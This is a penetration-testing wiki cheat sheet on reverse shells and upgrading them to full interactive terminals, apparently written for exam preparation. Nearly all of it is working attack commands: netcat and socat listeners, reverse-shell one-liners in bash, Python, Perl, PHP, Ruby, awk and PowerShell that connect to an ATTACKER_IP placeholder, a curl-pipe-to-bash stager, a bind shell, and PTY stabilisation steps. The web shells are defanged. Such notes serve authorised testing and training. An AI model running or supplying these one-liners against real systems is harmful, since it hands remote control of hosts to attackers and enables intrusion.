---
type: technique
title: Reverse shells & TTY upgrade
lang: en
status: active
wstg: []
owasp_top10: []
owasp_api: []
asvs: []
cwe: []
attack: ["T1059"]
cvss: ""
sources: []
updated: 2026-09-17
---

# Reverse shells & TTY upgrade

**TL;DR** — Once you have command execution ([[command-injection]], [[ssti]], [[lfi]],
[[file-upload]], [[sql-injection]]→web shell), turn it into an **interactive shell**: start a
listener, fire a reverse-shell one-liner from the target, then **upgrade the dumb shell to a
full PTY** so you get job control, tab-completion, arrow keys, and `sudo`/`ssh` that need a tty.
Post-exploitation payoff, not a vuln class.

> ⚠️ **AV / OneDrive note:** this vault is Microsoft-Defender-synced, and reverse-shell strings
> are exactly what AV flags. The one-liners below use **`ATTACKER_IP`/`PORT` placeholders** and
> web-shell bodies are **defanged**. If a line gets quarantined, keep the working copy off this
> vault and reconstruct it at test time. Generator: **revshells.com** (offline copy recommended).

## 1. Start the listener (attacker box)

```bash
nc -lvnp PORT                       # classic; dies on disconnect, no PTY
rlwrap nc -lvnp PORT                # rlwrap adds line-editing/history to the dumb shell
ncat -lvnp PORT                     # ncat; add --ssl for an encrypted catcher
ncat --ssl -lvnp PORT
socat -d -d TCP-LISTEN:PORT,reuseaddr FILE:`tty`,raw,echo=0   # full-PTY catcher (best)
pwncat-cs -lp PORT                  # pwncat: auto-stabilises the PTY + post-exp toolkit
```

## 2. Reverse-shell one-liners (Linux target)

Pick one the target actually has; `ATTACKER_IP`/`PORT` are placeholders.

```bash
# bash (the go-to)
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
# sh fallback
sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
# nc with -e (older/busybox)
nc ATTACKER_IP PORT -e /bin/sh
# nc without -e (mkfifo — when -e is unavailable)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f
# python / python3 (also gives a PTY straight away)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# php
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
# ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("ATTACKER_IP",PORT);loop{c.puts `#{c.gets.chomp}`}'
# socat (encrypted-capable, stable)
socat TCP:ATTACKER_IP:PORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
# awk / telnet (last-resort, minimal boxes)
awk 'BEGIN{s="/inet/tcp/0/ATTACKER_IP/PORT";while(1){do{printf "> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'
```

## 3. Reverse-shell one-liners (Windows target)

```powershell
# PowerShell TCPClient (paste-ready; often the only thing available)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sr=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sr,0,$sr.Length);$s.Flush()}"
# ConPtyShell (full Windows PTY) or nc.exe ATTACKER_IP PORT -e cmd.exe when a static nc.exe is dropped
```
Base64-encode the PowerShell payload (`powershell -e <b64>`) to survive quoting — build it at
test time; blobs are not stored here.

## 4. Firing it through a web sink

Inject the one-liner into the RCE context; URL-encode as the context needs, or host a **stager**
and pull it:

```bash
# on the attacker box: echo the bash one-liner into shell.sh, serve it
python3 -m http.server 80
# on the target (via the injection point):
curl ATTACKER_IP/shell.sh | bash          #  or: wget -qO- ATTACKER_IP/shell.sh | bash
# base64 to dodge quoting/filters:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8uLi4 | base64 -d | bash    # (placeholder b64)
```
Bind shell instead (when egress is filtered but a port is reachable inbound):
`nc -lvnp PORT -e /bin/sh` on the target, connect from the attacker.

## 5. Upgrade a dumb shell → full PTY (the important part)

A raw `nc` shell has no job control, no tab-completion, no arrows, and `Ctrl-C` kills it. Fix it:

```bash
# 1. spawn a PTY (pick what the box has)
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null                     # if python is absent
# 2. background the shell and fix the local terminal
#    press:  Ctrl-Z
stty raw -echo; fg                                 # (type "fg" blind, press Enter)
#    press Enter again; then in the shell:
reset                                              # or:  export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 180                           # match your terminal (get values with `stty -a` locally)
```
Now you have arrows, tab-completion, `Ctrl-C`, and `sudo`/`ssh`/`su` work. **socat** or
**pwncat** give a full PTY with no manual dance:

```bash
# target side, when the listener is the socat/pwncat catcher from §1:
socat TCP:ATTACKER_IP:PORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

## 6. Web shells (defanged — for upload / LFI footholds)

When you can write a file to an executable path ([[file-upload]]) or include one ([[lfi]]), a
minimal command web shell bootstraps RCE. **Defanged** on purpose (reconstruct at test time):

```php
<?php /* cmd web shell: read $_REQUEST['c'] -> command-exec function -> echo output (reconstruct) */ ?>
```
```jsp
<%-- jsp: read request param "c" -> Runtime.exec -> stream output (reconstruct) --%>
```
Then trigger `shell.php?c=id`, confirm, and pivot to a reverse shell above.

## 7. Gotchas / exam tips

- **Pick a port egress allows** — `443`, `53`, `80` beat a random high port through firewalls.
- **No bash?** try `sh`; **no python?** use `script`/`socat`; **no nc `-e`?** use the mkfifo form.
- **Restricted shell (rbash)?** break out via `vi`/`awk`/`python`/`ssh -t … bash --noprofile`.
- **Stabilise before exploring** — do the PTY upgrade *first*, or a stray `Ctrl-C` drops your shell.
- **Catch with [[netcat]]** for quick work, **socat/pwncat** for a shell you'll keep.
- **Msfvenom** generates staged/compiled payloads (`-p linux/x64/shell_reverse_tcp LHOST=… LPORT=…`);
  build them at test time — no payloads stored here.

## See also

[[netcat]] · [[command-injection]] · [[ssti]] · [[lfi]] · [[file-upload]] · [[sql-injection]] · [[oswa-exam]]

*General-reference cheat-sheet (built at the user's request; `sources: []`). Reconstruct any AV-flagged line at test time; the wiki documents, it never runs these.*
